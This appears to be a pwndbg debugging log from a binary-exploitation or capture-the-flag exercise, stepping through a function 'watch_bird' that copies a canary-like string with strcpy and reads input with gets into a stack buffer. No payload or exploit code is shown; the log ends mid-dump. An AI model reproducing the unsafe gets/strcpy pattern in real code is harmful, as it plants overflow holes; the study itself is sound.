+   0x80486f6 <watch_bird+3>     sub    esp, 0xa8
+   0x80486fc <watch_bird+9>     lea    eax, [ebp - 0x10]
+   0x80486ff <watch_bird+12>    mov    dword ptr [ebp - 0xc], eax
+ ► 0x8048702 <watch_bird+15>    sub    esp, 8
+   0x8048705 <watch_bird+18>    push   dword ptr [ebp + 8]
+   0x8048708 <watch_bird+21>    lea    eax, [ebp - 0x10]
+   0x804870b <watch_bird+24>    push   eax
+   0x804870c <watch_bird+25>    call   strcpy@plt <0x80484a0>
+ 
+   0x8048711 <watch_bird+30>    add    esp, 0x10
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+01:0004│      0xffffc4e4 —▸ 0xf7f70af3 ◂— insd   dword ptr es:[edi], dx /* 'malloc(): memory corruption' */
+02:0008│      0xffffc4e8 ◂— 0x2
+03:000c│      0xffffc4ec ◂— 0x4
+04:0010│      0xffffc4f0 ◂— 0x20 /* ' ' */
+05:0014│      0xffffc4f4 ◂— 0x2
+06:0018│      0xffffc4f8 ◂— 0x0
+07:001c│      0xffffc4fc ◂— 0x38 /* '8' */
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  8048702 watch_bird+15
+   f 1  80487bc main+41
+   f 2 f7e2c647 __libc_start_main+247
+pwndbg> n
+0x08048705 in watch_bird ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0xffffc578 ◂— 0x0
+ EBX  0x0
+ ECX  0xf7fc7780 (main_arena) ◂— 0
+ EDX  0x4b
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 —▸ 0xffffc5b8 ◂— 0x0
+ ESP  0xffffc4d8 —▸ 0xffffc598 —▸ 0xffffc5b8 ◂— 0x0
+ EIP  0x8048705 (watch_bird+18) ◂— push   dword ptr [ebp + 8]
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+   0x80486f4 <watch_bird+1>     mov    ebp, esp
+   0x80486f6 <watch_bird+3>     sub    esp, 0xa8
+   0x80486fc <watch_bird+9>     lea    eax, [ebp - 0x10]
+   0x80486ff <watch_bird+12>    mov    dword ptr [ebp - 0xc], eax
+   0x8048702 <watch_bird+15>    sub    esp, 8
+ ► 0x8048705 <watch_bird+18>    push   dword ptr [ebp + 8]
+   0x8048708 <watch_bird+21>    lea    eax, [ebp - 0x10]
+   0x804870b <watch_bird+24>    push   eax
+   0x804870c <watch_bird+25>    call   strcpy@plt <0x80484a0>
+ 
+   0x8048711 <watch_bird+30>    add    esp, 0x10
+   0x8048714 <watch_bird+33>    sub    esp, 0xc
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc4d8 —▸ 0xffffc598 —▸ 0xffffc5b8 ◂— 0x0
+01:0004│      0xffffc4dc ◂— 0x2710
+02:0008│      0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+03:000c│      0xffffc4e4 —▸ 0xf7f70af3 ◂— insd   dword ptr es:[edi], dx /* 'malloc(): memory corruption' */
+04:0010│      0xffffc4e8 ◂— 0x2
+05:0014│      0xffffc4ec ◂— 0x4
+06:0018│      0xffffc4f0 ◂— 0x20 /* ' ' */
+07:001c│      0xffffc4f4 ◂— 0x2
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  8048705 watch_bird+18
+   f 1  80487bc main+41
+   f 2 f7e2c647 __libc_start_main+247
+pwndbg> n
+0x08048708 in watch_bird ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0xffffc578 ◂— 0x0
+ EBX  0x0
+ ECX  0xf7fc7780 (main_arena) ◂— 0
+ EDX  0x4b
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 —▸ 0xffffc5b8 ◂— 0x0
+ ESP  0xffffc4d4 —▸ 0x804b008 ◂— 0x4b3430 /* '04K' */
+ EIP  0x8048708 (watch_bird+21) ◂— lea    eax, [ebp - 0x10]
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+   0x80486f6 <watch_bird+3>     sub    esp, 0xa8
+   0x80486fc <watch_bird+9>     lea    eax, [ebp - 0x10]
+   0x80486ff <watch_bird+12>    mov    dword ptr [ebp - 0xc], eax
+   0x8048702 <watch_bird+15>    sub    esp, 8
+   0x8048705 <watch_bird+18>    push   dword ptr [ebp + 8]
+ ► 0x8048708 <watch_bird+21>    lea    eax, [ebp - 0x10]
+   0x804870b <watch_bird+24>    push   eax
+   0x804870c <watch_bird+25>    call   strcpy@plt <0x80484a0>
+ 
+   0x8048711 <watch_bird+30>    add    esp, 0x10
+   0x8048714 <watch_bird+33>    sub    esp, 0xc
+   0x8048717 <watch_bird+36>    push   0x8048860
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc4d4 —▸ 0x804b008 ◂— 0x4b3430 /* '04K' */
+01:0004│      0xffffc4d8 —▸ 0xffffc598 —▸ 0xffffc5b8 ◂— 0x0
+02:0008│      0xffffc4dc ◂— 0x2710
+03:000c│      0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+04:0010│      0xffffc4e4 —▸ 0xf7f70af3 ◂— insd   dword ptr es:[edi], dx /* 'malloc(): memory corruption' */
+05:0014│      0xffffc4e8 ◂— 0x2
+06:0018│      0xffffc4ec ◂— 0x4
+07:001c│      0xffffc4f0 ◂— 0x20 /* ' ' */
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  8048708 watch_bird+21
+   f 1  80487bc main+41
+   f 2 f7e2c647 __libc_start_main+247
+pwndbg> n
+0x0804870b in watch_bird ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0xffffc578 ◂— 0x0
+ EBX  0x0
+ ECX  0xf7fc7780 (main_arena) ◂— 0
+ EDX  0x4b
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 —▸ 0xffffc5b8 ◂— 0x0
+ ESP  0xffffc4d4 —▸ 0x804b008 ◂— 0x4b3430 /* '04K' */
+ EIP  0x804870b (watch_bird+24) ◂— push   eax
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+   0x80486fc <watch_bird+9>     lea    eax, [ebp - 0x10]
+   0x80486ff <watch_bird+12>    mov    dword ptr [ebp - 0xc], eax
+   0x8048702 <watch_bird+15>    sub    esp, 8
+   0x8048705 <watch_bird+18>    push   dword ptr [ebp + 8]
+   0x8048708 <watch_bird+21>    lea    eax, [ebp - 0x10]
+ ► 0x804870b <watch_bird+24>    push   eax
+   0x804870c <watch_bird+25>    call   strcpy@plt <0x80484a0>
+ 
+   0x8048711 <watch_bird+30>    add    esp, 0x10
+   0x8048714 <watch_bird+33>    sub    esp, 0xc
+   0x8048717 <watch_bird+36>    push   0x8048860
+   0x804871c <watch_bird+41>    call   puts@plt <0x80484c0>
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc4d4 —▸ 0x804b008 ◂— 0x4b3430 /* '04K' */
+01:0004│      0xffffc4d8 —▸ 0xffffc598 —▸ 0xffffc5b8 ◂— 0x0
+02:0008│      0xffffc4dc ◂— 0x2710
+03:000c│      0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+04:0010│      0xffffc4e4 —▸ 0xf7f70af3 ◂— insd   dword ptr es:[edi], dx /* 'malloc(): memory corruption' */
+05:0014│      0xffffc4e8 ◂— 0x2
+06:0018│      0xffffc4ec ◂— 0x4
+07:001c│      0xffffc4f0 ◂— 0x20 /* ' ' */
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  804870b watch_bird+24
+   f 1  80487bc main+41
+   f 2 f7e2c647 __libc_start_main+247
+pwndbg> n
+0x0804870c in watch_bird ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0xffffc578 ◂— 0x0
+ EBX  0x0
+ ECX  0xf7fc7780 (main_arena) ◂— 0
+ EDX  0x4b
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 —▸ 0xffffc5b8 ◂— 0x0
+ ESP  0xffffc4d0 —▸ 0xffffc578 ◂— 0x0
+ EIP  0x804870c (watch_bird+25) —▸ 0xfffd8fe8 ◂— 0xfffd8fe8
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+   0x80486ff <watch_bird+12>    mov    dword ptr [ebp - 0xc], eax
+   0x8048702 <watch_bird+15>    sub    esp, 8
+   0x8048705 <watch_bird+18>    push   dword ptr [ebp + 8]
+   0x8048708 <watch_bird+21>    lea    eax, [ebp - 0x10]
+   0x804870b <watch_bird+24>    push   eax
+ ► 0x804870c <watch_bird+25>    call   strcpy@plt <0x80484a0>
+        dest: 0xffffc578 ◂— 0x0
+        src: 0x804b008 ◂— 0x4b3430 /* '04K' */
+ 
+   0x8048711 <watch_bird+30>    add    esp, 0x10
+   0x8048714 <watch_bird+33>    sub    esp, 0xc
+   0x8048717 <watch_bird+36>    push   0x8048860
+   0x804871c <watch_bird+41>    call   puts@plt <0x80484c0>
+ 
+   0x8048721 <watch_bird+46>    add    esp, 0x10
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc4d0 —▸ 0xffffc578 ◂— 0x0
+01:0004│      0xffffc4d4 —▸ 0x804b008 ◂— 0x4b3430 /* '04K' */
+02:0008│      0xffffc4d8 —▸ 0xffffc598 —▸ 0xffffc5b8 ◂— 0x0
+03:000c│      0xffffc4dc ◂— 0x2710
+04:0010│      0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+05:0014│      0xffffc4e4 —▸ 0xf7f70af3 ◂— insd   dword ptr es:[edi], dx /* 'malloc(): memory corruption' */
+06:0018│      0xffffc4e8 ◂— 0x2
+07:001c│      0xffffc4ec ◂— 0x4
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  804870c watch_bird+25
+   f 1  80487bc main+41
+   f 2 f7e2c647 __libc_start_main+247
+pwndbg> n
+0x08048711 in watch_bird ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0xffffc578 ◂— 0x4b3430 /* '04K' */
+ EBX  0x0
+ ECX  0x804b008 ◂— 0x4b3430 /* '04K' */
+ EDX  0xffffc578 ◂— 0x4b3430 /* '04K' */
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 —▸ 0xffffc5b8 ◂— 0x0
+ ESP  0xffffc4d0 —▸ 0xffffc578 ◂— 0x4b3430 /* '04K' */
+ EIP  0x8048711 (watch_bird+30) ◂— add    esp, 0x10
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+   0x8048702 <watch_bird+15>    sub    esp, 8
+   0x8048705 <watch_bird+18>    push   dword ptr [ebp + 8]
+   0x8048708 <watch_bird+21>    lea    eax, [ebp - 0x10]
+   0x804870b <watch_bird+24>    push   eax
+   0x804870c <watch_bird+25>    call   strcpy@plt <0x80484a0>
+ 
+ ► 0x8048711 <watch_bird+30>    add    esp, 0x10
+   0x8048714 <watch_bird+33>    sub    esp, 0xc
+   0x8048717 <watch_bird+36>    push   0x8048860
+   0x804871c <watch_bird+41>    call   puts@plt <0x80484c0>
+ 
+   0x8048721 <watch_bird+46>    add    esp, 0x10
+   0x8048724 <watch_bird+49>    sub    esp, 0xc
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc4d0 —▸ 0xffffc578 ◂— 0x4b3430 /* '04K' */
+01:0004│      0xffffc4d4 —▸ 0x804b008 ◂— 0x4b3430 /* '04K' */
+02:0008│      0xffffc4d8 —▸ 0xffffc598 —▸ 0xffffc5b8 ◂— 0x0
+03:000c│      0xffffc4dc ◂— 0x2710
+04:0010│      0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+05:0014│      0xffffc4e4 —▸ 0xf7f70af3 ◂— insd   dword ptr es:[edi], dx /* 'malloc(): memory corruption' */
+06:0018│      0xffffc4e8 ◂— 0x2
+07:001c│      0xffffc4ec ◂— 0x4
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  8048711 watch_bird+30
+   f 1  80487bc main+41
+   f 2 f7e2c647 __libc_start_main+247
+pwndbg> n
+0x08048714 in watch_bird ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0xffffc578 ◂— 0x4b3430 /* '04K' */
+ EBX  0x0
+ ECX  0x804b008 ◂— 0x4b3430 /* '04K' */
+ EDX  0xffffc578 ◂— 0x4b3430 /* '04K' */
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 —▸ 0xffffc5b8 ◂— 0x0
+ ESP  0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EIP  0x8048714 (watch_bird+33) ◂— sub    esp, 0xc
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+   0x8048705 <watch_bird+18>    push   dword ptr [ebp + 8]
+   0x8048708 <watch_bird+21>    lea    eax, [ebp - 0x10]
+   0x804870b <watch_bird+24>    push   eax
+   0x804870c <watch_bird+25>    call   strcpy@plt <0x80484a0>
+ 
+   0x8048711 <watch_bird+30>    add    esp, 0x10
+ ► 0x8048714 <watch_bird+33>    sub    esp, 0xc
+   0x8048717 <watch_bird+36>    push   0x8048860
+   0x804871c <watch_bird+41>    call   puts@plt <0x80484c0>
+ 
+   0x8048721 <watch_bird+46>    add    esp, 0x10
+   0x8048724 <watch_bird+49>    sub    esp, 0xc
+   0x8048727 <watch_bird+52>    lea    eax, [ebp - 0xa4]
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+01:0004│      0xffffc4e4 —▸ 0xf7f70af3 ◂— insd   dword ptr es:[edi], dx /* 'malloc(): memory corruption' */
+02:0008│      0xffffc4e8 ◂— 0x2
+03:000c│      0xffffc4ec ◂— 0x4
+04:0010│      0xffffc4f0 ◂— 0x20 /* ' ' */
+05:0014│      0xffffc4f4 ◂— 0x2
+06:0018│      0xffffc4f8 ◂— 0x0
+07:001c│      0xffffc4fc ◂— 0x38 /* '8' */
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  8048714 watch_bird+33
+   f 1  80487bc main+41
+   f 2 f7e2c647 __libc_start_main+247
+pwndbg> n
+0x08048717 in watch_bird ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0xffffc578 ◂— 0x4b3430 /* '04K' */
+ EBX  0x0
+ ECX  0x804b008 ◂— 0x4b3430 /* '04K' */
+ EDX  0xffffc578 ◂— 0x4b3430 /* '04K' */
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 —▸ 0xffffc5b8 ◂— 0x0
+ ESP  0xffffc4d4 —▸ 0x804b008 ◂— 0x4b3430 /* '04K' */
+ EIP  0x8048717 (watch_bird+36) ◂— push   0x8048860
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+   0x8048708 <watch_bird+21>    lea    eax, [ebp - 0x10]
+   0x804870b <watch_bird+24>    push   eax
+   0x804870c <watch_bird+25>    call   strcpy@plt <0x80484a0>
+ 
+   0x8048711 <watch_bird+30>    add    esp, 0x10
+   0x8048714 <watch_bird+33>    sub    esp, 0xc
+ ► 0x8048717 <watch_bird+36>    push   0x8048860
+   0x804871c <watch_bird+41>    call   puts@plt <0x80484c0>
+ 
+   0x8048721 <watch_bird+46>    add    esp, 0x10
+   0x8048724 <watch_bird+49>    sub    esp, 0xc
+   0x8048727 <watch_bird+52>    lea    eax, [ebp - 0xa4]
+   0x804872d <watch_bird+58>    push   eax
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc4d4 —▸ 0x804b008 ◂— 0x4b3430 /* '04K' */
+01:0004│      0xffffc4d8 —▸ 0xffffc598 —▸ 0xffffc5b8 ◂— 0x0
+02:0008│      0xffffc4dc ◂— 0x2710
+03:000c│      0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+04:0010│      0xffffc4e4 —▸ 0xf7f70af3 ◂— insd   dword ptr es:[edi], dx /* 'malloc(): memory corruption' */
+05:0014│      0xffffc4e8 ◂— 0x2
+06:0018│      0xffffc4ec ◂— 0x4
+07:001c│      0xffffc4f0 ◂— 0x20 /* ' ' */
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  8048717 watch_bird+36
+   f 1  80487bc main+41
+   f 2 f7e2c647 __libc_start_main+247
+pwndbg> n
+0x0804871c in watch_bird ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0xffffc578 ◂— 0x4b3430 /* '04K' */
+ EBX  0x0
+ ECX  0x804b008 ◂— 0x4b3430 /* '04K' */
+ EDX  0xffffc578 ◂— 0x4b3430 /* '04K' */
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 —▸ 0xffffc5b8 ◂— 0x0
+ ESP  0xffffc4d0 —▸ 0x8048860 ◂— push   esp /* 'Tell me: what bird are you watching?' */
+ EIP  0x804871c (watch_bird+41) —▸ 0xfffd9fe8 ◂— 0x0
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+   0x804870b <watch_bird+24>    push   eax
+   0x804870c <watch_bird+25>    call   strcpy@plt <0x80484a0>
+ 
+   0x8048711 <watch_bird+30>    add    esp, 0x10
+   0x8048714 <watch_bird+33>    sub    esp, 0xc
+   0x8048717 <watch_bird+36>    push   0x8048860
+ ► 0x804871c <watch_bird+41>    call   puts@plt <0x80484c0>
+        s: 0x8048860 ◂— 'Tell me: what bird are you watching?'
+ 
+   0x8048721 <watch_bird+46>    add    esp, 0x10
+   0x8048724 <watch_bird+49>    sub    esp, 0xc
+   0x8048727 <watch_bird+52>    lea    eax, [ebp - 0xa4]
+   0x804872d <watch_bird+58>    push   eax
+   0x804872e <watch_bird+59>    call   gets@plt <0x8048470>
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc4d0 —▸ 0x8048860 ◂— push   esp /* 'Tell me: what bird are you watching?' */
+01:0004│      0xffffc4d4 —▸ 0x804b008 ◂— 0x4b3430 /* '04K' */
+02:0008│      0xffffc4d8 —▸ 0xffffc598 —▸ 0xffffc5b8 ◂— 0x0
+03:000c│      0xffffc4dc ◂— 0x2710
+04:0010│      0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+05:0014│      0xffffc4e4 —▸ 0xf7f70af3 ◂— insd   dword ptr es:[edi], dx /* 'malloc(): memory corruption' */
+06:0018│      0xffffc4e8 ◂— 0x2
+07:001c│      0xffffc4ec ◂— 0x4
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  804871c watch_bird+41
+   f 1  80487bc main+41
+   f 2 f7e2c647 __libc_start_main+247
+pwndbg> n
+Tell me: what bird are you watching?
+0x08048721 in watch_bird ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0x25
+ EBX  0x0
+ ECX  0xffffffff
+ EDX  0xf7fc8870 (_IO_stdfile_1_lock) ◂— 0
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 —▸ 0xffffc5b8 ◂— 0x0
+ ESP  0xffffc4d0 —▸ 0x8048860 ◂— push   esp /* 'Tell me: what bird are you watching?' */
+ EIP  0x8048721 (watch_bird+46) ◂— add    esp, 0x10
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+   0x804870c <watch_bird+25>    call   strcpy@plt <0x80484a0>
+ 
+   0x8048711 <watch_bird+30>    add    esp, 0x10
+   0x8048714 <watch_bird+33>    sub    esp, 0xc
+   0x8048717 <watch_bird+36>    push   0x8048860
+   0x804871c <watch_bird+41>    call   puts@plt <0x80484c0>
+ 
+ ► 0x8048721 <watch_bird+46>    add    esp, 0x10
+   0x8048724 <watch_bird+49>    sub    esp, 0xc
+   0x8048727 <watch_bird+52>    lea    eax, [ebp - 0xa4]
+   0x804872d <watch_bird+58>    push   eax
+   0x804872e <watch_bird+59>    call   gets@plt <0x8048470>
+ 
+   0x8048733 <watch_bird+64>    add    esp, 0x10
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc4d0 —▸ 0x8048860 ◂— push   esp /* 'Tell me: what bird are you watching?' */
+01:0004│      0xffffc4d4 —▸ 0x804b008 ◂— 0x4b3430 /* '04K' */
+02:0008│      0xffffc4d8 —▸ 0xffffc598 —▸ 0xffffc5b8 ◂— 0x0
+03:000c│      0xffffc4dc ◂— 0x2710
+04:0010│      0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+05:0014│      0xffffc4e4 —▸ 0xf7f70af3 ◂— insd   dword ptr es:[edi], dx /* 'malloc(): memory corruption' */
+06:0018│      0xffffc4e8 ◂— 0x2
+07:001c│      0xffffc4ec ◂— 0x4
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  8048721 watch_bird+46
+   f 1  80487bc main+41
+   f 2 f7e2c647 __libc_start_main+247
+pwndbg> n
+0x08048724 in watch_bird ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0x25
+ EBX  0x0
+ ECX  0xffffffff
+ EDX  0xf7fc8870 (_IO_stdfile_1_lock) ◂— 0
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 —▸ 0xffffc5b8 ◂— 0x0
+ ESP  0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EIP  0x8048724 (watch_bird+49) ◂— sub    esp, 0xc
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+   0x8048711 <watch_bird+30>    add    esp, 0x10
+   0x8048714 <watch_bird+33>    sub    esp, 0xc
+   0x8048717 <watch_bird+36>    push   0x8048860
+   0x804871c <watch_bird+41>    call   puts@plt <0x80484c0>
+ 
+   0x8048721 <watch_bird+46>    add    esp, 0x10
+ ► 0x8048724 <watch_bird+49>    sub    esp, 0xc
+   0x8048727 <watch_bird+52>    lea    eax, [ebp - 0xa4]
+   0x804872d <watch_bird+58>    push   eax
+   0x804872e <watch_bird+59>    call   gets@plt <0x8048470>
+ 
+   0x8048733 <watch_bird+64>    add    esp, 0x10
+   0x8048736 <watch_bird+67>    sub    esp, 0xc
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+01:0004│      0xffffc4e4 —▸ 0xf7f70af3 ◂— insd   dword ptr es:[edi], dx /* 'malloc(): memory corruption' */
+02:0008│      0xffffc4e8 ◂— 0x2
+03:000c│      0xffffc4ec ◂— 0x4
+04:0010│      0xffffc4f0 ◂— 0x20 /* ' ' */
+05:0014│      0xffffc4f4 ◂— 0x2
+06:0018│      0xffffc4f8 ◂— 0x0
+07:001c│      0xffffc4fc ◂— 0x38 /* '8' */
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  8048724 watch_bird+49
+   f 1  80487bc main+41
+   f 2 f7e2c647 __libc_start_main+247
+pwndbg> n
+0x08048727 in watch_bird ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0x25
+ EBX  0x0
+ ECX  0xffffffff
+ EDX  0xf7fc8870 (_IO_stdfile_1_lock) ◂— 0
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 —▸ 0xffffc5b8 ◂— 0x0
+ ESP  0xffffc4d4 —▸ 0x804b008 ◂— 0x4b3430 /* '04K' */
+ EIP  0x8048727 (watch_bird+52) ◂— lea    eax, [ebp - 0xa4]
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+   0x8048714 <watch_bird+33>    sub    esp, 0xc
+   0x8048717 <watch_bird+36>    push   0x8048860
+   0x804871c <watch_bird+41>    call   puts@plt <0x80484c0>
+ 
+   0x8048721 <watch_bird+46>    add    esp, 0x10
+   0x8048724 <watch_bird+49>    sub    esp, 0xc
+ ► 0x8048727 <watch_bird+52>    lea    eax, [ebp - 0xa4]
+   0x804872d <watch_bird+58>    push   eax
+   0x804872e <watch_bird+59>    call   gets@plt <0x8048470>
+ 
+   0x8048733 <watch_bird+64>    add    esp, 0x10
+   0x8048736 <watch_bird+67>    sub    esp, 0xc
+   0x8048739 <watch_bird+70>    lea    eax, [ebp - 0xa4]
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc4d4 —▸ 0x804b008 ◂— 0x4b3430 /* '04K' */
+01:0004│      0xffffc4d8 —▸ 0xffffc598 —▸ 0xffffc5b8 ◂— 0x0
+02:0008│      0xffffc4dc ◂— 0x2710
+03:000c│      0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+04:0010│      0xffffc4e4 —▸ 0xf7f70af3 ◂— insd   dword ptr es:[edi], dx /* 'malloc(): memory corruption' */
+05:0014│      0xffffc4e8 ◂— 0x2
+06:0018│      0xffffc4ec ◂— 0x4
+07:001c│      0xffffc4f0 ◂— 0x20 /* ' ' */
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  8048727 watch_bird+52
+   f 1  80487bc main+41
+   f 2 f7e2c647 __libc_start_main+247
+pwndbg> n
+0x0804872d in watch_bird ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0xffffc4e4 —▸ 0xf7f70af3 ◂— insd   dword ptr es:[edi], dx /* 'malloc(): memory corruption' */
+ EBX  0x0
+ ECX  0xffffffff
+ EDX  0xf7fc8870 (_IO_stdfile_1_lock) ◂— 0
